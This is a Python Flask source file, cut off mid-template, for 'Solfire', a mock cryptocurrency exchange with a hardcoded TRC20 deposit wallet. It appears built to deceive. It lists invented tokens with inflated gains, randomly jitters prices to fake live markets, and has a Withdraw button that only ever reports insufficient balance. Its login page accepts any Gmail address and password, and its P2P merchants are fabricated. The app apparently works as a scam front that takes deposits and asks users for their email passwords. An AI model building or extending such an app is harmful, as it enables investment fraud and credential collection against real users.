# app.py
# Solfire - Ultra Professional Exchange Edition
# Requires: flask, requests
# Run: python app.py  -> open http://127.0.0.1:5000/login-page

from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify
import os, secrets, threading, time, uuid, random
import requests
from functools import wraps

# ---------- CONFIG ----------
WALLET_ADDRESS = "TAMvBeCmd9VruNxPGjNamMR2wL9EMHNVnU"
NETWORK_LABEL = "TRX (TRC20)"

VS_CURRENCY = "usd"
FETCH_INTERVAL = 30         # Reduced API calls to avoid bans
CLIENT_POLL_MS = 1500       # Client polling (1.5 seconds for super fast updates)
TOP_N = 50                  

STARTING_USDT = 0.0         
# ----------------------------

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY") or secrets.token_hex(24)

# --- HARDCODED ROBUST INITIAL MARKET ---
# This ensures the screen is NEVER empty, even if the API fails.
INITIAL_MARKET = {
    "BTC": {"id": "bitcoin", "symbol": "BTC", "name": "Bitcoin", "price": 68450.20, "change_24h": 2.5, "image": "https://assets.coingecko.com/coins/images/1/large/bitcoin.png"},
    "ETH": {"id": "ethereum", "symbol": "ETH", "name": "Ethereum", "price": 3850.10, "change_24h": 1.2, "image": "https://assets.coingecko.com/coins/images/279/large/ethereum.png"},
    "SOL": {"id": "solana", "symbol": "SOL", "name": "Solana", "price": 175.40, "change_24h": 5.4, "image": "https://assets.coingecko.com/coins/images/4128/large/solana.png"},
    "BNB": {"id": "binancecoin", "symbol": "BNB", "name": "BNB", "price": 590.30, "change_24h": -0.5, "image": "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png"},
    "XRP": {"id": "ripple", "symbol": "XRP", "name": "XRP", "price": 0.62, "change_24h": 0.8, "image": "https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png"},
    "DOGE": {"id": "dogecoin", "symbol": "DOGE", "name": "Dogecoin", "price": 0.15, "change_24h": 12.0, "image": "https://assets.coingecko.com/coins/images/5/large/dogecoin.png"},
    "ADA": {"id": "cardano", "symbol": "ADA", "name": "Cardano", "price": 0.55, "change_24h": -1.2, "image": "https://assets.coingecko.com/coins/images/975/large/cardano.png"},
    "AVAX": {"id": "avalanche-2", "symbol": "AVAX", "name": "Avalanche", "price": 45.20, "change_24h": 3.1, "image": "https://assets.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Trans.png"},
    "TRX": {"id": "tron", "symbol": "TRX", "name": "TRON", "price": 0.12, "change_24h": 0.1, "image": "https://assets.coingecko.com/coins/images/1094/large/tron-logo.png"},
    "LINK": {"id": "chainlink", "symbol": "LINK", "name": "Chainlink", "price": 18.90, "change_24h": 4.5, "image": "https://assets.coingecko.com/coins/images/877/large/chainlink-new-logo.png"},
    "DOT": {"id": "polkadot", "symbol": "DOT", "name": "Polkadot", "price": 8.50, "change_24h": -2.1, "image": "https://assets.coingecko.com/coins/images/12171/large/polkadot.png"},
    "MATIC": {"id": "matic-network", "symbol": "MATIC", "name": "Polygon", "price": 0.95, "change_24h": 1.4, "image": "https://assets.coingecko.com/coins/images/4713/large/matic-token-icon.png"},
    "LTC": {"id": "litecoin", "symbol": "LTC", "name": "Litecoin", "price": 85.30, "change_24h": 0.5, "image": "https://assets.coingecko.com/coins/images/2/large/litecoin.png"},
    "BCH": {"id": "bitcoin-cash", "symbol": "BCH", "name": "Bitcoin Cash", "price": 450.20, "change_24h": 6.7, "image": "https://assets.coingecko.com/coins/images/780/large/bitcoin-cash-circle.png"},
    "SHIB": {"id": "shiba-inu", "symbol": "SHIB", "name": "Shiba Inu", "price": 0.000025, "change_24h": 15.3, "image": "https://assets.coingecko.com/coins/images/11939/large/shiba.png"},
    "UNI": {"id": "uniswap", "symbol": "UNI", "name": "Uniswap", "price": 11.20, "change_24h": -3.4, "image": "https://assets.coingecko.com/coins/images/12504/large/uniswap-uni.png"},
    "ATOM": {"id": "cosmos", "symbol": "ATOM", "name": "Cosmos", "price": 12.40, "change_24h": 2.2, "image": "https://assets.coingecko.com/coins/images/1481/large/cosmos_hub.png"},
    "XLM": {"id": "stellar", "symbol": "XLM", "name": "Stellar", "price": 0.13, "change_24h": 1.1, "image": "https://assets.coingecko.com/coins/images/100/large/Stellar_symbol_black_RGB.png"},
    "NEAR": {"id": "near", "symbol": "NEAR", "name": "NEAR Protocol", "price": 7.10, "change_24h": 8.9, "image": "https://assets.coingecko.com/coins/images/10365/large/near.png"},
    "APT": {"id": "aptos", "symbol": "APT", "name": "Aptos", "price": 14.50, "change_24h": -1.5, "image": "https://assets.coingecko.com/coins/images/26455/large/aptos_round.png"},
    "ARB": {"id": "arbitrum", "symbol": "ARB", "name": "Arbitrum", "price": 1.65, "change_24h": 4.2, "image": "https://assets.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg"},
    "OP": {"id": "optimism", "symbol": "OP", "name": "Optimism", "price": 3.80, "change_24h": 5.1, "image": "https://assets.coingecko.com/coins/images/25244/large/Optimism.png"},
    "INJ": {"id": "injective-protocol", "symbol": "INJ", "name": "Injective", "price": 38.20, "change_24h": 11.4, "image": "https://assets.coingecko.com/coins/images/12882/large/Secondary_Symbol.png"},
    "RNDR": {"id": "render-token", "symbol": "RNDR", "name": "Render", "price": 10.50, "change_24h": 7.8, "image": "https://assets.coingecko.com/coins/images/11636/large/rndr.png"},
    "FTM": {"id": "fantom", "symbol": "FTM", "name": "Fantom", "price": 0.95, "change_24h": -4.2, "image": "https://assets.coingecko.com/coins/images/4001/large/Fantom_round.png"},
    "TIA": {"id": "celestia", "symbol": "TIA", "name": "Celestia", "price": 15.20, "change_24h": 2.1, "image": "https://assets.coingecko.com/coins/images/31967/large/celestia-logo.png"},
    "SEI": {"id": "sei-network", "symbol": "SEI", "name": "Sei", "price": 0.85, "change_24h": 6.3, "image": "https://assets.coingecko.com/coins/images/28205/large/Sei_Logo_-_Transparent.png"},
    "SUI": {"id": "sui", "symbol": "SUI", "name": "Sui", "price": 1.70, "change_24h": -2.8, "image": "https://assets.coingecko.com/coins/images/26375/large/sui-ocean-square.png"},
    "PEPE": {"id": "pepe", "symbol": "PEPE", "name": "Pepe", "price": 0.000007, "change_24h": 25.4, "image": "https://assets.coingecko.com/coins/images/29850/large/pepe-token.jpeg"},
    "WIF": {"id": "dogwifcoin", "symbol": "WIF", "name": "dogwifhat", "price": 2.80, "change_24h": 40.5, "image": "https://assets.coingecko.com/coins/images/33566/large/dogwifhat.jpg"},
    
    # --- FAKE / CUSTOM COINS ---
    "SLFR": {"id": "solfire", "symbol": "SLFR", "name": "Solfire Token", "price": 1.45, "change_24h": 150.5, "image": "https://cryptologos.cc/logos/fire-token-fire-logo.png"},
    "MOON": {"id": "moon", "symbol": "MOON", "name": "Moon Coin", "price": 0.0045, "change_24h": 45.2, "image": "https://cryptologos.cc/logos/safemoon-safemoon-logo.png"},
    "GEMS": {"id": "gems", "symbol": "GEMS", "name": "Gems Network", "price": 0.08, "change_24h": -5.6, "image": "https://cryptologos.cc/logos/kucoin-token-kcs-logo.png"},
    "RICH": {"id": "rich", "symbol": "RICH", "name": "Rich Protocol", "price": 12.30, "change_24h": 80.1, "image": "https://cryptologos.cc/logos/pancakeswap-cake-logo.png"},
    "NINJA": {"id": "ninja", "symbol": "NINJA", "name": "Ninja Coin", "price": 5.50, "change_24h": 12.4, "image": "https://cryptologos.cc/logos/sushi-sushi-logo.png"},
}

# in-memory stores
market_cache = {"last_update": 0, "data": INITIAL_MARKET.copy(), "prev": {}}
users_store = {}   
global_orderbook = {"limit_orders": []}

# ---------- helpers ----------
def login_required(fn):
    @wraps(fn)
    def wrapper(*a, **kw):
        if not session.get("user"):
            return redirect(url_for("login_page"))
        return fn(*a, **kw)
    return wrapper

def current_session_id():
    sid = session.get("_sid")
    if not sid:
        sid = str(uuid.uuid4())
        session["_sid"] = sid
    return sid

def ensure_user_store():
    sid = current_session_id()
    if sid not in users_store:
        bal = {"USDT": float(STARTING_USDT)}
        symbols = list(market_cache.get("data", {}).keys())
        for s in symbols:
            bal[s] = 0.0
        users_store[sid] = {"balances": bal, "orders": [], "trades": [], "transfers": []}
    return users_store[sid]

# ---------- dynamic fetch top N coins ----------
def fetch_prices_once():
    url = "https://api.coingecko.com/api/v3/coins/markets"
    params = {
        "vs_currency": VS_CURRENCY,
        "order": "market_cap_desc",
        "per_page": TOP_N,
        "page": 1,
        "sparkline": "false",
        "price_change_percentage": "24h"
    }
    try:
        resp = requests.get(url, params=params, timeout=10)
        resp.raise_for_status()
        arr = resp.json()
        new = INITIAL_MARKET.copy() 
        
        for item in arr:
            sym = (item.get("symbol") or "").upper()
            if sym in ["SLFR", "MOON", "GEMS", "RICH", "NINJA"]: continue 
            name = item.get("name") or ""
            cid = item.get("id") or ""
            price = item.get("current_price")
            change24 = item.get("price_change_percentage_24h")
            image = item.get("image")
            if price is not None:
                new[sym] = {"id": cid, "symbol": sym, "name": name, "price": float(price), "change_24h": change24, "image": image}
        
        market_cache["prev"] = market_cache.get("data", {}).copy()
        market_cache["data"] = new
        market_cache["last_update"] = int(time.time())
    except Exception as e:
        pass

# ---------- Live Simulation Engine (Micro Jitters) ----------
def micro_jitter_worker():
    while True:
        data = market_cache.get("data", {})
        for k, v in data.items():
            if v.get("price"):
                jitter = random.uniform(-0.0015, 0.0015)
                v["price"] = max(1e-8, v["price"] * (1 + jitter))
            
            if v.get("change_24h") is not None:
                c_jitter = random.uniform(-0.05, 0.05)
                v["change_24h"] = v["change_24h"] + c_jitter

        try_match_limits()
        time.sleep(1.5) 

def background_api_worker():
    while True:
        try:
            fetch_prices_once()
        except:
            pass
        time.sleep(FETCH_INTERVAL)

bg_api = threading.Thread(target=background_api_worker, daemon=True)
bg_api.start()

bg_jitter = threading.Thread(target=micro_jitter_worker, daemon=True)
bg_jitter.start()

# ---------- order execution ----------
def execute_order(order, exec_price, is_limit=False):
    sid = order["session_id"]
    user = users_store.get(sid)
    if not user: return
    qty = float(order["quantity"])
    cost = qty * float(exec_price)
    side = order["side"]
    sym = order["symbol"]
    if side == "buy":
        if user["balances"]["USDT"] + 1e-9 < cost:
            order["status"] = "cancelled_insufficient_funds"
            user["orders"].append(order); return
        user["balances"]["USDT"] -= cost
        user["balances"][sym] = user["balances"].get(sym, 0.0) + qty
    else:
        if user["balances"].get(sym,0.0) + 1e-9 < qty:
            order["status"] = "cancelled_insufficient_balance"
            user["orders"].append(order); return
        user["balances"][sym] -= qty
        user["balances"]["USDT"] += cost
    rec = dict(order)
    rec["executed_price"] = float(exec_price)
    rec["status"] = "filled"
    rec["filled_at"] = int(time.time())
    user["orders"].append(rec)
    user["trades"].append({"id": str(uuid.uuid4()), "symbol": sym, "side": side, "price": float(exec_price), "quantity": qty, "timestamp": int(time.time()), "from_limit": bool(is_limit)})

def try_match_limits():
    data = market_cache.get("data", {})
    to_rm = []
    for order in list(global_orderbook["limit_orders"]):
        sym = order["symbol"]
        price_now = data.get(sym, {}).get("price")
        if price_now is None: continue
        if order["side"] == "buy" and price_now <= order["limit_price"]:
            execute_order(order, price_now, is_limit=True); to_rm.append(order)
        elif order["side"] == "sell" and price_now >= order["limit_price"]:
            execute_order(order, price_now, is_limit=True); to_rm.append(order)
    for o in to_rm:
        try: global_orderbook["limit_orders"].remove(o)
        except: pass

# ---------- routes ----------
@app.route("/login-page")
def login_page():
    err = request.args.get("error", "")
    html = """<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Solfire Pro - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>body{margin:0;height:100vh;font-family:'Inter',sans-serif;background:#0b0e11;display:flex;align-items:center;justify-content:center;color:#eaecef}
    .box{width:92%;max-width:400px;padding:32px;border-radius:16px;background:#181a20;box-shadow: 0 8px 24px rgba(0,0,0,0.5);}
    label{display:block;margin-top:16px;color:#848e9c;font-size:14px;font-weight:600}
    input{width:100%;padding:12px;border-radius:8px;border:1px solid #2b3139;background:#0b0e11;color:#eaecef;margin-top:8px;box-sizing:border-box;}
    input:focus{outline:none;border-color:#fcd535;}
    .btn{width:100%;padding:14px;border-radius:8px;background:#fcd535;border:none;color:#181a20;font-weight:800;font-size:16px;margin-top:24px;cursor:pointer;transition:0.2s}
    .btn:hover{background:#e0be2f;}
    .err{margin-top:10px;color:#f6465c;background:rgba(246,70,92,0.1);padding:10px;border-radius:8px;font-size:14px}
    </style></head><body><div class="box">
    <div style="font-weight:800;color:#fcd535;font-size:32px;text-align:center;margin-bottom:8px;">SOLFIRE</div>
    <div style="color:#848e9c;text-align:center;margin-bottom:24px;font-size:14px">Professional Crypto Exchange</div>
    {% if err %}<div class="err">{{ err }}</div>{% endif %}
    <form method="post" action="{{ url_for('do_login') }}">
      <label>Email Address</label><input name="email" placeholder="user@gmail.com" autocomplete="off"/>
      <label>Password</label><input name="password" type="password" placeholder="••••••••" autocomplete="off"/>
      <button class="btn" type="submit">Log In</button>
    </form></div></body></html>"""
    return render_template_string(html, err=err)

@app.route("/login", methods=["POST"])
def do_login():
    email = (request.form.get("email") or "").strip()
    pwd = (request.form.get("password") or "")
    if not email or not pwd:
        return redirect(url_for("login_page", error="Email and password required"))
    if not email.lower().endswith("@gmail.com"):
        return redirect(url_for("login_page", error="Use a valid @gmail.com account"))
    session["user"] = {"email": email, "name": email.split("@")[0]}
    ensure_user_store()
    return redirect(url_for("home"))

@app.route("/logout")
def logout():
    session.pop("user", None)
    return redirect(url_for("login_page"))

@app.route("/api/prices")
def api_prices():
    return jsonify({"last_update": market_cache.get("last_update",0), "data": market_cache.get("data", {})})

@app.route("/api/account")
@login_required
def api_account():
    store = ensure_user_store()
    return jsonify({"usdt": store["balances"].get("USDT", 0.0), "orders": store["orders"], "trades": store["trades"], "transfers": store["transfers"]})

@app.route("/api/place_order", methods=["POST"])
@login_required
def api_place_order():
    sid = current_session_id()
    store = ensure_user_store()
    payload = request.get_json() or request.form
    symbol = (payload.get("symbol") or "").upper()
    side = (payload.get("side") or "").lower()
    typ = (payload.get("type") or "").lower()
    try: qty = float(payload.get("quantity") or 0.0)
    except: return jsonify({"ok": False, "error": "invalid quantity"}), 400
    if symbol not in market_cache.get("data", {}): return jsonify({"ok": False, "error": "unknown symbol"}), 400
    if side not in ("buy","sell"): return jsonify({"ok": False, "error": "invalid side"}), 400
    if typ not in ("market","limit"): return jsonify({"ok": False, "error": "invalid type"}), 400
    if qty <= 0: return jsonify({"ok": False, "error": "quantity must be > 0"}), 400
    market = market_cache.get("data", {}).get(symbol, {})
    price_now = market.get("price")
    order = {"id": str(uuid.uuid4()), "session_id": sid, "symbol": symbol, "side": side, "type": typ, "quantity": qty, "created_at": int(time.time()), "status": "open"}
    if typ == "market":
        if price_now is None: return jsonify({"ok": False, "error": "market price unavailable"}), 400
        execute_order(order, price_now, is_limit=False)
        return jsonify({"ok": True, "executed_price": price_now})
    else:
        try: lim = float(payload.get("limit_price"))
        except: return jsonify({"ok": False, "error": "invalid limit_price"}), 400
        order["limit_price"] = lim
        if side == "buy":
            reserve = lim * qty
            if store["balances"]["USDT"] + 1e-9 < reserve: return jsonify({"ok": False, "error": "insufficient USDT"}), 400
            store["balances"]["USDT"] -= reserve
            order["reserved_usdt"] = reserve
        else:
            if store["balances"].get(symbol,0.0) + 1e-9 < qty: return jsonify({"ok": False, "error": f"insufficient {symbol}"}), 400
            store["balances"][symbol] -= qty
            order["reserved_qty"] = qty
        global_orderbook["limit_orders"].append(order)
        return jsonify({"ok": True, "placed": order})

@app.route("/")
@login_required
def home():
    user = session.get("user", {"name":"User","email":""})
    html = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
    <title>Solfire Pro - Exchange</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #0b0e11;
            --card: #181a20;
            --card-hover: #2b3139;
            --text: #eaecef;
            --muted: #848e9c;
            --accent: #fcd535;
            --green: #0ecb81;
            --red: #f6465c;
            --border: #2b3139;
        }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); padding-bottom: 70px; user-select: none; -webkit-tap-highlight-color: transparent; overflow-x: hidden; }
        * { box-sizing: border-box; }
        
        /* Utilities */
        .text-green { color: var(--green) !important; }
        .text-red { color: var(--red) !important; }
        .text-muted { color: var(--muted) !important; }
        .flex { display: flex; }
        .items-center { align-items: center; }
        .justify-between { justify-content: space-between; }
        .font-bold { font-weight: 700; }
        .font-semibold { font-weight: 600; }
        .w-full { width: 100%; }
        
        /* Header */
        .app-header { padding: 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); }
        .logo-area { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 20px; color: var(--accent); }
        .header-icons { display: flex; gap: 16px; font-size: 18px; color: var(--text); }
        
        /* Balance Card */
        .balance-section { padding: 20px 16px; border-bottom: 8px solid var(--card); }
        .balance-title { color: var(--muted); font-size: 14px; margin-bottom: 8px; }
        .balance-amount { font-size: 32px; font-weight: 700; margin-bottom: 4px; }
        .balance-sub { font-size: 14px; }
        
        .action-buttons { display: flex; gap: 12px; margin-top: 20px; }
        .btn-action { flex: 1; padding: 12px 0; border-radius: 8px; font-weight: 600; font-size: 14px; text-align: center; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 6px; }
        .btn-action i { font-size: 18px; }
        .btn-deposit { background: var(--accent); color: #000; }
        .btn-secondary { background: var(--card-hover); color: var(--text); }
        
        /* Grid Menu */
        .grid-menu { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px 8px; padding: 20px 16px; border-bottom: 8px solid var(--card); }
        .grid-item { display: flex; flex-direction: column; align-items: center; gap: 8px; font-size: 12px; color: var(--muted); cursor: pointer; }
        .grid-icon { width: 40px; height: 40px; border-radius: 12px; background: var(--card-hover); display: flex; align-items: center; justify-content: center; font-size: 18px; color: var(--accent); transition: 0.2s; }
        .grid-item:hover .grid-icon { background: var(--border); }
        
        /* Markets List */
        .market-tabs { display: flex; gap: 20px; padding: 16px; border-bottom: 1px solid var(--border); overflow-x: auto; white-space: nowrap; }
        .market-tab { color: var(--muted); font-size: 15px; font-weight: 600; cursor: pointer; padding-bottom: 8px; }
        .market-tab.active { color: var(--text); border-bottom: 2px solid var(--accent); }
        .market-list { padding: 0 16px; }
        .market-header { display: flex; justify-content: space-between; padding: 12px 0; color: var(--muted); font-size: 12px; }
        
        .coin-row { display: flex; align-items: center; justify-content: space-between; padding: 16px 0; border-bottom: 1px solid var(--card); }
        .coin-info { display: flex; align-items: center; gap: 12px; width: 40%; }
        .coin-img { width: 32px; height: 32px; border-radius: 50%; }
        .coin-name { font-weight: 600; font-size: 16px; display: flex; align-items: baseline; gap: 4px;}
        .coin-vol { font-size: 12px; color: var(--muted); }
        .coin-price { width: 30%; text-align: right; font-weight: 600; font-size: 16px; }
        .coin-change { width: 30%; display: flex; justify-content: flex-end; }
        .change-badge { padding: 6px 12px; border-radius: 4px; font-weight: 600; font-size: 14px; min-width: 75px; text-align: center; }
        .bg-green { background: rgba(14, 203, 129, 0.15); color: var(--green); }
        .bg-red { background: rgba(246, 70, 92, 0.15); color: var(--red); }
        
        /* Bottom Nav */
        .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; height: 65px; background: var(--card); border-top: 1px solid var(--border); display: flex; justify-content: space-around; align-items: center; z-index: 50; }
        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: var(--muted); font-size: 11px; font-weight: 600; cursor: pointer; }
        .nav-item i { font-size: 20px; }
        .nav-item.active { color: var(--accent); }
        
        /* ======= FULL SCREEN MODALS (The Magic) ======= */
        .full-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 1000; display: none; flex-direction: column; overflow-y: auto; transform: translateX(100%); transition: transform 0.3s ease; }
        .full-modal.active { display: flex; transform: translateX(0); }
        .modal-header { padding: 16px; display: flex; align-items: center; gap: 16px; border-bottom: 1px solid var(--border); background: var(--bg); position: sticky; top: 0; z-index: 10; }
        .back-btn { font-size: 20px; color: var(--text); cursor: pointer; padding: 4px; }
        .modal-title { font-size: 18px; font-weight: 700; flex: 1; }
        .modal-content { padding: 16px; flex: 1; }

        /* P2P Styles */
        .p2p-tabs { display: flex; background: var(--card); border-radius: 8px; margin-bottom: 16px; padding: 4px; }
        .p2p-tab { flex: 1; text-align: center; padding: 8px; border-radius: 6px; font-weight: 600; cursor: pointer; color: var(--muted); }
        .p2p-tab.active.buy { background: var(--green); color: white; }
        .p2p-tab.active.sell { background: var(--red); color: white; }
        .p2p-filters { display: flex; gap: 10px; margin-bottom: 16px; overflow-x: auto; }
        .p2p-filter-btn { padding: 6px 12px; background: var(--card); border-radius: 16px; font-size: 13px; color: var(--text); white-space: nowrap; border: 1px solid var(--border); }
        .p2p-merchant { background: var(--card); border-radius: 12px; padding: 16px; margin-bottom: 12px; }
        .merchant-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
        .merchant-name { font-weight: 600; display: flex; align-items: center; gap: 8px; }
        .merchant-badge { width: 24px; height: 24px; border-radius: 50%; background: var(--accent); color: black; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; }
        .merchant-stats { font-size: 12px; color: var(--muted); }
        .merchant-price { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
        .merchant-limits { font-size: 12px; color: var(--muted); margin-bottom: 12px; line-height: 1.6; }
        .btn-p2p-buy { background: var(--green); color: white; padding: 8px 16px; border-radius: 6px; font-weight: 600; border: none; cursor: pointer; width: 100px; text-align: center; }
        
        /* Buy Crypto Styles */
        .buy-box { background: var(--card); border-radius: 16px; padding: 20px; margin-top: 20px; }
        .input-group { border: 1px solid var(--border); border-radius: 12px; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; background: var(--bg); }
        .input-group input { background: transparent; border: none; color: var(--text); font-size: 24px; font-weight: 700; width: 60%; outline: none; }
        .coin-selector { display: flex; align-items: center; gap: 8px; font-weight: 600; background: var(--card-hover); padding: 6px 12px; border-radius: 20px; }
        .buy-huge-btn { background: var(--accent); color: #000; width: 100%; padding: 16px; border-radius: 12px; font-size: 18px; font-weight: 800; border: none; cursor: pointer; margin-top: 10px; }
        
        /* Earn Styles */
        .earn-hero { background: linear-gradient(135deg, #181a20 0%, #2b3139 100%); padding: 30px 20px; border-radius: 16px; margin-bottom: 20px; text-align: center; border: 1px solid var(--border); }
        .earn-item { display: flex; align-items: center; justify-content: space-between; padding: 16px; background: var(--card); border-radius: 12px; margin-bottom: 12px; }
        .earn-apr { color: var(--green); font-weight: 700; font-size: 18px; }
        .btn-subscribe { background: var(--accent); border: none; padding: 8px 16px; border-radius: 6px; font-weight: 600; cursor: pointer; color: black; }
        
        /* More Styles */
        .more-section { margin-bottom: 24px; }
        .more-section-title { font-size: 16px; font-weight: 700; margin-bottom: 16px; padding-left: 8px; border-left: 3px solid var(--accent); }
        .more-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px 8px; }
        .more-item { display: flex; flex-direction: column; align-items: center; gap: 8px; font-size: 12px; color: var(--text); cursor: pointer; text-align: center; }
        .more-icon { width: 44px; height: 44px; border-radius: 12px; background: var(--card); display: flex; align-items: center; justify-content: center; font-size: 20px; color: var(--accent); }
        
        /* Toasts */
        #toast-container { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
        .toast { background: var(--card-hover); color: white; padding: 12px 24px; border-radius: 8px; font-weight: 600; box-shadow: 0 4px 12px rgba(0,0,0,0.5); border-left: 4px solid var(--accent); animation: fadeInDown 0.3s forwards; }
        @keyframes fadeInDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        
    </style>
</head>
<body>

    <div id="main-view">
        <header class="app-header">
            <div class="logo-area">
                <i class="fa-solid fa-fire"></i> SOLFIRE
            </div>
            <div class="header-icons">
                <i class="fa-solid fa-magnifying-glass"></i>
                <i class="fa-solid fa-qrcode"></i>
                <i class="fa-regular fa-bell"></i>
            </div>
        </header>

        <section class="balance-section">
            <div class="balance-title">Total Balance</div>
            <div class="balance-amount">0.00 <span style="font-size: 18px">USDT</span></div>
            <div class="balance-sub text-green">+0.00 (1.50%) Today</div>
            
            <div class="action-buttons">
                <div class="btn-action btn-deposit" onclick="showToast('Deposit address generated')">
                    <i class="fa-solid fa-wallet"></i> Deposit
                </div>
                <div class="btn-action btn-secondary" onclick="showToast('Insufficient balance for withdrawal')">
                    <i class="fa-solid fa-paper-plane"></i> Withdraw
                </div>
                <div class="btn-action btn-secondary" onclick="showToast('Transfer module ready')">
                    <i class="fa-solid fa-right-left"></i> Transfer
                </div>
            </div>
        </section>

        <section class="grid-menu">
            <div class="grid-item" onclick="openModal('p2p-modal')">
                <div class="grid-icon"><i class="fa-solid fa-users"></i></div>
                <span>P2P Trading</span>
            </div>
            <div class="grid-item" onclick="openModal('buy-crypto-modal')">
                <div class="grid-icon"><i class="fa-solid fa-credit-card"></i></div>
                <span>Buy Crypto</span>
            </div>
            <div class="grid-item" onclick="openModal('earn-modal')">
                <div class="grid-icon"><i class="fa-solid fa-piggy-bank"></i></div>
                <span>Earn</span>
            </div>
            <div class="grid-item" onclick="openModal('more-modal')">
                <div class="grid-icon"><i class="fa-solid fa-ellipsis"></i></div>
                <span>More</span>
            </div>
        </section>

        <section class="market-section">
            <div class="market-tabs">
                <div class="market-tab"><i class="fa-solid fa-star"></i> Favorites</div>
                <div class="market-tab active">Hot</div>
                <div class="market-tab">Gainers</div>
                <div class="market-tab">Losers</div>
                <div class="market-tab">New Listings</div>
            </div>
            
            <div class="market-list">
                <div class="market-header">
                    <span style="width: 40%">Name / Vol</span>
                    <span style="width: 30%; text-align: right;">Last Price</span>
                    <span style="width: 30%; text-align: right;">24h Chg%</span>
                </div>
                <div id="coin-container">
                    </div>
            </div>
        </section>

        <nav class="bottom-nav">
            <div class="nav-item active"><i class="fa-solid fa-house"></i> Home</div>
            <div class="nav-item"><i class="fa-solid fa-chart-simple"></i> Markets</div>
            <div class="nav-item"><i class="fa-solid fa-money-bill-transfer"></i> Trade</div>
            <div class="nav-item"><i class="fa-solid fa-bolt"></i> Futures</div>
            <div class="nav-item"><i class="fa-solid fa-wallet"></i> Wallets</div>
        </nav>
    </div>

    <div id="p2p-modal" class="full-modal">
        <div class="modal-header">
            <i class="fa-solid fa-arrow-left back-btn" onclick="closeModal('p2p-modal')"></i>
            <div class="modal-title">P2P Trading</div>
            <i class="fa-solid fa-ellipsis-vertical text-muted"></i>
        </div>
        <div class="modal-content">
            <div class="p2p-tabs">
                <div class="p2p-tab active buy">Buy</div>
                <div class="p2p-tab">Sell</div>
            </div>
            <div class="p2p-filters">
                <div class="p2p-filter-btn">Amount <i class="fa-solid fa-angle-down"></i></div>
                <div class="p2p-filter-btn">Payment <i class="fa-solid fa-angle-down"></i></div>
                <div class="p2p-filter-btn">Filter <i class="fa-solid fa-filter"></i></div>
            </div>
            
            <div class="p2p-merchant">
                <div class="merchant-header">
                    <div class="merchant-name"><div class="merchant-badge">C</div> CryptoKing_Pro <i class="fa-solid fa-circle-check text-accent"></i></div>
                    <div class="merchant-stats">2450 trades | 99.8%</div>
                </div>
                <div class="merchant-price text-green">1.02 USD</div>
                <div class="flex justify-between items-center">
                    <div class="merchant-limits">
                        Crypto Amount: 5,430.50 USDT<br>
                        Limit: $50.00 - $2,000.00
                    </div>
                    <button class="btn-p2p-buy" onclick="showToast('Order Placed with CryptoKing_Pro')">Buy</button>
                </div>
                <div style="font-size: 11px; color: var(--muted); display:flex; gap: 8px;">
                    <span style="border-left: 2px solid var(--accent); padding-left: 4px;">Bank Transfer</span>
                    <span style="border-left: 2px solid var(--accent); padding-left: 4px;">Wise</span>
                </div>
            </div>

            <div class="p2p-merchant">
                <div class="merchant-header">
                    <div class="merchant-name"><div class="merchant-badge">F</div> FastPay_Global</div>
                    <div class="merchant-stats">890 trades | 97.2%</div>
                </div>
                <div class="merchant-price text-green">1.03 USD</div>
                <div class="flex justify-between items-center">
                    <div class="merchant-limits">
                        Crypto Amount: 1,200.00 USDT<br>
                        Limit: $10.00 - $500.00
                    </div>
                    <button class="btn-p2p-buy" onclick="showToast('Order Placed with FastPay_Global')">Buy</button>
                </div>
                <div style="font-size: 11px; color: var(--muted); display:flex; gap: 8px;">
                    <span style="border-left: 2px solid var(--accent); padding-left: 4px;">PayPal</span>
                    <span style="border-left: 2px solid var(--accent); padding-left: 4px;">Skrill</span>
                </div>
            </div>
        </div>
    </div>

    <div id="buy-crypto-modal" class="full-modal">
        <div class="modal-header">
            <i class="fa-solid fa-arrow-left back-btn" onclick="closeModal('buy-crypto-modal')"></i>
            <div class="modal-title">Buy Crypto</div>
            <i class="fa-solid fa-clock-rotate-left text-muted"></i>
        </div>
        <div class="modal-content">
            <div class="buy-box">
                <label class="text-muted font-semibold" style="display:block; margin-bottom: 8px;">Spend</label>
                <div class="input-group">
                    <input type="number" placeholder="100.00" id="fiat-amount" oninput="calculateCrypto()">
                    <div class="coin-selector">USD <i class="fa-solid fa-angle-down"></i></div>
                </div>
                
                <label class="text-muted font-semibold" style="display:block; margin-bottom: 8px;">Receive (Est.)</label>
                <div class="input-group">
                    <input type="text" placeholder="0.00" id="crypto-amount" readonly style="color: var(--accent);">
                    <div class="coin-selector">USDT <i class="fa-solid fa-angle-down"></i></div>
                </div>
                
